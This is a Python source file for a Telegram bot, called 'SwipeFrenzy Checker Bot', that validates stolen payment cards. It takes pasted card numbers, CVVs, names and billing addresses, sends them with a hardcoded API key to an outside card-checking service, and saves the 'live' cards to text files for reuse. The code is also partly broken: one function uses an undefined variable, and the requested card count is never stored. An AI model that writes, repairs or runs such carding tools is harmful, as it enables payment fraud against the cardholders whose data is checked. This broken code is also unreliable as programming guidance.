import telebot
import requests
import datetime
import random
import os
from telebot import types

TOKEN = os.getenv("TOKEN")
if not TOKEN:
    TOKEN = input("Enter your Telegram Bot Token: ")

bot = telebot.TeleBot(TOKEN)

user_data = {}

API_KEY = "e243b2046e7cfeef3b9e8c28e9897d87"
USERNAME = "EscoCCs"
BASE_URL = "https://mirror1.luxchecker.vc/apiv2/"
CHECK_TYPE = "avk.php"   # Change to ck.php if you want normal CC check

# ==================== CHECK FUNCTION ====================
def check_card(parts):
    if len(parts) < 11:
        return {"status": "error", "msg": "Invalid format"}
    
    try:
        cardnum = parts[0].strip()
        expm = parts[1].strip()
        expy = parts[2].strip()
        cvv = parts[3].strip()
        fname = parts[4].strip()
        lname = parts[5].strip()
        address = parts[6].strip()
        city = parts[7].strip()
        state = parts[8].strip()
        zipcode = parts[9].strip()
        country = parts[10].strip()
        gmail = parts[11].strip() if len(parts) > 11 else ""
        ip = parts[12].strip() if len(parts) > 12 else ""

        bot.send_message(message.chat.id, f"🔍 Checking {cardnum[-4:]}...")  # Progress feedback

        payload = {
            "cardnum": cardnum,
            "expm": expm,
            "expy": expy,
            "cvv": cvv,
            "fname": fname,
            "lname": lname,
            "address": address,
            "city": city,
            "state": state,
            "zip": zipcode,
            "country": country,
            "key": API_KEY,
            "username": USERNAME
        }

        r = requests.get(BASE_URL + CHECK_TYPE, params=payload, timeout=20)
        response = r.json()

        if response.get("error"):
            return {"status": "error", "msg": response.get("error")}

        if response.get("result") == 1:
            return {
                "status": "live",
                "data": {
                    "card": cardnum,
                    "exp": f"{expm}/{expy}",
                    "cvv": cvv,
                    "name": f"{fname} {lname}",
                    "bank": "Unknown Bank",
                    "country": f"{country} • Mastercard",
                    "address": f"{address}, {city}, {state} {zipcode}",
                    "phone": "N/A",
                    "email": gmail,
                    "ip": ip,
                    "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
            }
        else:
            return {"status": "dead"}
            
    except Exception as e:
        return {"status": "error", "msg": str(e)}

# ==================== COMMANDS ====================
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('/check', '/tester')
    bot.reply_to(message, "👋 **SwipeFrenzy Checker Bot** Ready.\n\nUse /check or /tester", parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(commands=['check'])
def start_check(message):
    user_id = message.chat.id
    user_data[user_id] = {"target": 0, "lives": [], "mode": "check"}
    bot.reply_to(message, "How many live cards do you need?")

@bot.message_handler(commands=['tester'])
def tester_cmd(message):
    user_id = message.chat.id
    user_data[user_id] = {"mode": "tester"}
    bot.reply_to(message, "✅ Tester Mode ON\nSend one card at a time. I will keep asking until I get a **LIVE** one.")

# ==================== MESSAGE HANDLER ====================
@bot.message_handler(func=lambda m: True)
def handle_message(message):
    user_id = message.chat.id
    if user_id not in user_data:
        bot.reply_to(message, "Please start with /start")
        return

    data = user_data[user_id]
    parts = [x.strip() for x in message.text.split("|")]
    
    result = check_card(parts)

    if result["status"] == "error":
        bot.reply_to(message, f"❌ Error: {result.get('msg', 'Unknown error')}")
        return

    if data.get("mode") == "tester":
        if result["status"] == "live":
            filename = f"tester{random.randint(1000,9999)}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(format_live_card(result["data"]))
            bot.reply_to(message, f"✅ **LIVE CARD FOUND!**\nSaved to: `{filename}`", parse_mode='Markdown')
            del user_data[user_id]
        else:
            bot.reply_to(message, "❌ Dead. Send another card.")

    elif data.get("mode") == "check":
        if result["status"] == "live":
            data["lives"].append(result["data"])
            bot.reply_to(message, f"✅ LIVE! ({len(data['lives'])}/{data['target']})")
        else:
            bot.reply_to(message, "❌ Dead")

        if len(data["lives"]) >= data.get("target", 1):
            with open("lives.txt", "a", encoding="utf-8") as f:
                for card in data["lives"]:
                    f.write(format_live_card(card) + "\n\n")
            bot.reply_to(message, f"🎯 Target reached! Saved to lives.txt")
            del user_data[user_id]
        else:
            bot.reply_to(message, f"Need {data['target'] - len(data['lives'])} more live cards. Keep sending.")

def format_live_card(info):
    return f"""
══════════════════════════════════════
👤 Name : {info['name']}
💳 Card : {info['card']}
📅 Expiry : {info['exp']}
🔒 CVV : {info['cvv']}
🏦 Bank : {info['bank']}
🌍 Country : {info['country']}
📍 Billing Address: {info['address']}
📞 Phone : {info['phone']}
✉️ Email : {info['email']}
🌐 IP : {info['ip']}
🕒 Checked : {info['time']}
══════════════════════════════════════
""".strip()

print("SwipeFrenzy Bot Started...")
bot.infinity_polling()
